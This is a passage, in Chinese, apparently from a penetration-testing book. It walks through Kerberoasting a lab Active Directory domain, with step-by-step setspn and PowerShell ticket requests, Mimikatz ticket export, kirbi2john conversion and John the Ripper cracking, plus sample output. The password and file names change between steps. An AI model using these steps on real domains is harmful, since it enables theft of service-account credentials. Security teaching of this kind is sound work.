    \n### 4. 离线破解\n\n然后，攻击者可以尝试使用 Hashcat 或 John the Ripper 等工具在离线环境下破解服务票证，以揭示与服务账户关联的明文密码。\n\
    \n### 5. 票证传递攻击（未涵盖）\n\n在某些场景下，攻击者可能会使用 Rubeus 进行票证传递攻击，通过呈现捕获的票证来获得对服务的未授权访问，而无需破解票证。\n\
    \n这只是 Rubeus 某个功能的非常简单的概述。你可以使用 Rubeus 攻击活动目录（Active Directory）的许多其他方式。例如，你可以按组织单元（OU）攻击特定的用户或组。请参阅工具\
    \ Wiki 以获取更多信息。\n\n## KERBEROAST 工具包\n\n**GitHub 网站：** https://github.com/nidem/kerberoast\n\
    \nKerberoast 是一组用于攻击 Kerberos 的工具。执行 Kerberoasting 的完整过程在工具网站上已有覆盖。为了方便起见，此处复制了这些步骤。你还需要下载\
    \ Mimikatz 并将其可执行文件（Mimikatz.exe）放置在目标 Windows 系统上。Mimikatz 在下一节中进行了介绍。\n\n- 在你的\
    \ Kali 系统上下载 Kerberoast 工具包。\n- 在 Kali 终端中，输入 `git clone https://github.com/nidem/kerberoast.git`\n\
    - 然后更改目录到 kerberoast\n\n在 Windows Server 目标的 PowerShell 中：\n\n- 输入，`setspn -T\
    \ domain -Q */*`\n- 然后，`Add-Type -AssemblyName System.IdentityModel`\n- 最后，`setspn.exe\
    \ -T DOMAIN.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken\
    \ -ArgumentList $_.Context.PostContext[0].Trim() }`\n\n这些是内置的 Microsoft 命令，将提取票证并将其保存到内存中。\n\
    \n```\nPS C:\\Users\\Administrator> Add-Type -AssemblyName System.IdentityModel\n\
    PS C:\\Users\\Administrator> setspn.exe -T DOMAIN.local -Q */* | Select-String\
    \  $Context.PostContext[0].Trim()\n\nId : uuid-0f341948-63fb-42a6-a673-546dbdb61fbfd-1\n\
    SecurityKeys : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}\nValidFrom\
    \ : 11/17/2023 8:11:35 PM\nValidTo : 11/18/2023 5:57:43 AM\nServicePrincipalName\
    \ : Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EBB4/TEMP-DC.DOMAIN.LOCAL\nSecurityKey\
    \ : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey\n\nId : uuid-0f341948-63fb-42a6-a673-546dbdb61fbfd-2\n\
    SecurityKeys : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}\nValidFrom\
    \ : 11/17/2023 8:11:35 PM\nValidTo : 11/17/2023 8:13:35 PM\nServicePrincipalName\
    \ : kadmin/changePW\nSecurityKey : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey\n\
    ```\n\n这将提取安全账户的 Kerberos 票证并将其放入活动内存中。现在，我们只需要一个工具来从这些中提取哈希并将其保存到一个文件中。为此，我们可以使用工具\
    \ Mimikatz。\n\n- 下载 [Mimikatz](https://github.com/gentilkiwi/mimikatz) 并将 Mimikatz.exe\
    \ 文件保存到你的 Windows Server 目标。\n- 打开命令提示符并运行 Mimikatz\n- 在 Mimikatz 提示符下输入，`“kerberos::list\
    \ /export”`\n\nMimikatz 将从内存中提取所有 Kerberos 票证并将它们保存为单独的文件。\n\n```\nC:\\Data\\\
    mimikatz\n\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\n.## ^ ##.\
    \ “A La Vie, A L’Amour” - (oe.eo)\n## / \\ ## /** Benjamin DELPY `gentilkiwi`\
    \ ( benjamin@gentilkiwi.com )\n## \\/ ## > https://blog.gentilkiwi.com/mimikatz\n\
    '## \\\\ ## Vincent LE TOUX ( vincent.letoux@gmail.com )\n '####' > https://pingcastle.com\
    \ / https://mysmartlogon.com **/\n\nmimikatz # kerberos::list /export\n\n[00000000]\
    \ - 0x00000012 - as56_hmac\nStart/End/MaxRenew: 11/17/2023 2:57:43 PM ; 11/18/2023\
    \ 12:57:43 AM ; 11/24/2023 2:57:43 PM\nServer Name : krbtgt/DOMAIN.LOCAL @ DOMAIN.LOCAL\n\
    Client Name : Administrator @ DOMAIN.LOCAL\nFlags 40a10000 : name_canonicalize\
    \ ; pre_authent ; initial ; renewable ; forwardable ;\n* Saved to file : 0-40a10000-Administrator@krbtgt-DOMAIN.LOCAL-DOMAIN.LOCAL.kirbi\n\
    ```\n\n我们现在拥有了许多服务账户的加密哈希；我们要做的只是破解它们！我们不能直接破解哈希；它的格式不兼容。你需要将 Mimikatz 的 `.kirbi`\
    \ 保存文件转换为 Hashcat 或 John the Ripper 所需的格式。我们可以通过将 kirbi 文件复制到我们的 Kali 系统，然后使用\
    \ Kerberoast 工具包文件 \"kirbi2john\" 进行转换来实现这一点。\n\n- 将你要破解的 Kerberos .kirbi 文件复制到我们在\
    \ Kali 系统上的 Kerberoast 目录\n- 然后运行，`\"kirbi2john -o [output_file_name] [Mimikatz_Kirbi_File]\"\
    `\n\n```\n(kali@kali:~)$ kerberoast\n$ kirbi2john -o hash.txt 61-40a10000-Administrator@ftp~ESMWLPT1000001-DOMAIN.LOCAL.kirbi\n\
    tickets written: 1\n```\n\n现在，让我们破解它！\n\n为此，我们将使用 John the Ripper 和一个单词列表。在这个例子中，我只创建了一个包含正确密码的单词列表。别担心，我们稍后会更深入地介绍单词列表和破解。目前，我只想展示一个快速破解的示例。\n\
    \n- `John ./[Hash_to_Crack] --format=krb5tgs --wordlist=[wordlist]`\n\n我们只需调用\
    \ John the Ripper，提供密码哈希、Kerberos 格式和一个单词列表。\n\n```\n(kali@kali:~)$ kerberoast\n\
    $ john ./crack.txt --format=krb5tgs --wordlist=kerbwl.txt\nUsing default input\
    \ encoding: UTF-8\nLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4\
    \ HMAC-MD5 RC4])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost\
    \ any other key for status\nWarning: Only 1 candidate left, minimum 4 needed for\
    \ performance.\n0g 0:00:00:00 DONE (2023-11-17 19:19) 0g/s 33.33p/s 33.33c/s 33.33C/s\
    \ Password123!\nSession completed.\n```\n\n我们做到了！我们成功地从 Kerberos 中提取了一个服务账户密码哈希，并使用\
    \ PowerShell 将其保存到内存中。然后我们使用 Mimikatz 从内存中提取数据并将其保存到文件。我们将文件转换为破解程序可以处理的格式。最后，我们成功破解了密码\
    \ `\"Passw0rd123!\"`。再次强调，这只是一个例子，我们将在后续章节中更深入地探讨破解！\n\n"
